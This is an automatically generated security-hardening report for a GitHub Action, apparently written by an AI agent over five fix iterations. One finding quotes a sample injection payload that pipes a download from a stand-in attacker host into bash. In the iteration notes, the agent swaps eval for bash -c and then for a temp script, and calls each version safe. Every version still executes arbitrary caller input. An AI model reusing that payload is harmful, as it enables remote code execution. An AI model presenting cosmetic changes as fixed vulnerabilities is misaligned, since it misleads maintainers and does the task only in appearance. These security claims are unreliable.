<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.2** was hardened automatically. 4 finding(s) were identified and resolved across 5 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Build' step directly interpolates ${{ inputs.install_command }} and ${{ inputs.build_command }} inside a run: shell block (sub-rule a). Because these expressions are substituted into the shell script before the shell parses it, any caller of this composite action can supply arbitrary shell commands as input values (e.g., "; curl attacker.com | bash") and achieve remote code execution on the runner. The values must be moved to env: variables and those variables must be double-quoted in the script, or the commands must be validated/allowlisted before use.

Locations:

- `action.yaml:36`

### unpinned-uses (severity: high)

Three uses: references in action.yaml use mutable version tags instead of pinned 40-character commit SHAs, making the action vulnerable to supply-chain attacks if those tags are moved or overwritten:
  - actions/checkout@v3 (line 31)
  - actions/upload-pages-artifact@v2 (line 42)
  - actions/deploy-pages@v3 (line 47)
Each should be pinned to a full SHA digest, e.g. actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3.

Locations:

- `action.yaml:31`
- `action.yaml:42`
- `action.yaml:47`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all findings in hardened/action/action.yaml:
1. script-injection / static-inline-injection: Moved ${{ inputs.install_command }} and ${{ inputs.build_command }} from the run: shell block into an env: map (INSTALL_COMMAND, BUILD_COMMAND). The shell script uses eval "$INSTALL_COMMAND" and eval "$BUILD_COMMAND" to execute them safely as environment variables rather than inline expressions.
2. unpinned-uses: Pinned all three action references to full commit SHAs:
   - actions/checkout@v3 → @f43a0e5ff2bd294095638e18286ca9a3d1956744 # v3
   - actions/upload-pages-artifact@v2 → @a753861a5debcf57bf8b404356158c8e1e33150c # v2
   - actions/deploy-pages@v3 → @13b55b33dd8996121833dbc1db458c793a334630 # v3
Note: The findings referenced both action.yaml and action.yml, but only action.yaml exists in the repository — both sets of findings were addressed in that single file.

### Iteration 2

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

Removed `eval` from both `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` in the Build step of action.yaml. The commands are now executed directly as `$INSTALL_COMMAND` and `$BUILD_COMMAND` without the double-evaluation that `eval` introduces. The inputs remain properly isolated in the `env:` block (not interpolated into the run script string), which is the correct pattern. This eliminates the eval-dynamic injection vector while preserving the intended functionality of running user-specified install and build commands.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Fixed the unquoted variable expansion in the 'Build' step of action.yaml. Changed bare `$INSTALL_COMMAND` and `$BUILD_COMMAND` to `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This double-quotes the variables (satisfying sub-rule b) while correctly executing multi-word shell commands like 'npm ci' and 'npm run build-storybook'. The env block mapping from `inputs.install_command`/`inputs.build_command` to `INSTALL_COMMAND`/`BUILD_COMMAND` was already correct and unchanged.

### Iteration 4

**Fixes applied:** script-injection

**Notes:**

Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` with `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` in the 'Build' step of action.yaml. The `eval` command re-parses the string in the current shell, allowing full shell metacharacter interpretation. Using `bash -c` instead runs the command in a subshell, which is the standard safe alternative to `eval` for executing command strings. The inputs are still correctly passed via the `env:` block rather than inline in the run script.

### Iteration 5

**Fixes applied:** script-injection

**Notes:**

Fixed the script injection vulnerability in the 'Build' step of action.yaml. Replaced `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` with a safe pattern that writes each command to a temporary script file using `printf '%s\n' "$VAR" > file` and then executes the file with `bash file`. This prevents user-controlled input from being passed as an argument to `bash -c`, which would re-interpret the entire string as shell code and allow arbitrary command injection. Temporary files are cleaned up after execution.

